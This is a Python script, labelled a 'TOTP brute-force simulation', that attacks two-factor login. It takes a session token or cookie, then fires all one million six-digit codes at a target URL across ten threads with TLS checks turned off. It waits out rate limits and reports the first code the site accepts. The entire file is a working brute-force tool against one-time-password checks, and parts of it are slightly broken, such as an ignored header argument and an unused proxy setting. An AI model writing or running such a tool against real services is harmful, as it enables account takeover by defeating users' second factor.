import argparse
import time
import sys
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

import urllib3
from datetime import datetime, timezone

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    sys.exit("Please install requests")

try:
    import pyotp
    PYOTP_AVAILABLE = True
except ImportError:
    PYOTP_AVAILABLE = False


def make_session(proxy = None):
    session = requests.Session()
    retries = Retry(total=3, backoff_factor=0.2, status_forcelist=[500, 502, 503])
    adapter = HTTPAdapter(max_retries=retries)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    if proxy:
        session.proxies = {'http': proxy, 'https': proxy}
    return session

def set_auth(session, token, cookie, header_name):
    if token:
        if cookie:
            session.cookies.set(cookie, token)
        elif header_name:
            session.headers["AUTHORIZATION"] = f"Bearer {token}"
        else:
            session.headers["AUTHORIZATION"] = f"Bearer {token}"


def enumerate_codes(session, url, field_code, success, verbose, start=0, end=999999):
    found = [None]  # shared result

    def try_single(code_int):
        if found[0]:
            return None
        code = f"{code_int:06d}"
        result = _try_code(session, url, code, field_code, success, verbose)
        if result == "success":
            found[0] = code
            print(f"\n[!!!] TOTP accepted: {code}")
        elif result == "ratelimited":
            time.sleep(30)
        return result

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(try_single, i): i for i in range(start, end+1)}
        for future in as_completed(futures):
            if found[0]:
                executor.shutdown(wait=False, cancel_futures=True)
                break

    return found[0]


def _try_code(session, url, code, field_code, success, verbose):
    payload = {field_code: code}

    try:
        response = session.post(url, data=payload, timeout=10, allow_redirects=True, verify=False)
        body = response.text.lower()
        success_lower = success.lower()

        if verbose:
            mark = "yes" if success_lower in body else "no"
            print(f"  [{mark}] {code} → HTTP {response.status_code}")
        if response.status_code == 429:
            return "ratelimited"
        if response.status_code in (423, 403) and "locked" in body:
            return "locked"
        if success_lower in body:
            return "success"

    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}")
    return "fail"

def save_report(data, path="totp_results.json"):
    data["generated"] = datetime.now(timezone.utc).isoformat()
    with open(path, "w") as f:
        json.dump(data, f, indent=2)
    print("Report saved to totp_results.json")


def main():
    parser = argparse.ArgumentParser(description="TOTP brute-force simulation")
    parser.add_argument("--url",          required=True)
    parser.add_argument("--mode",         required=True, choices=["enumerate"])
    parser.add_argument("--session-token", default=None)
    parser.add_argument("--cookie-name",  default=None)
    parser.add_argument("--header-name",  default=None)
    parser.add_argument("--field-code",   default="token")
    parser.add_argument("--success",      default="questionnaire")
    parser.add_argument("--verbose",      action="store_true")
    parser.add_argument("--output",       default="totp_results.json")
    parser.add_argument("--start",        type=int, default=0)
    parser.add_argument("--end",          type=int, default=999999)
    args = parser.parse_args()

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    s = make_session()
    set_auth(s, args.session_token, args.cookie_name, args.header_name)

    result_data = {"mode": args.mode, "url": args.url, "findings": []}

    if args.mode == "enumerate":
        code = enumerate_codes(s, args.url, args.field_code, args.success,
                                args.verbose, args.start, args.end)
        if code:
            result_data["findings"].append({"type": "enumeration_success", "code": code})


    save_report(result_data, args.output)

if __name__ == "__main__":
    main()

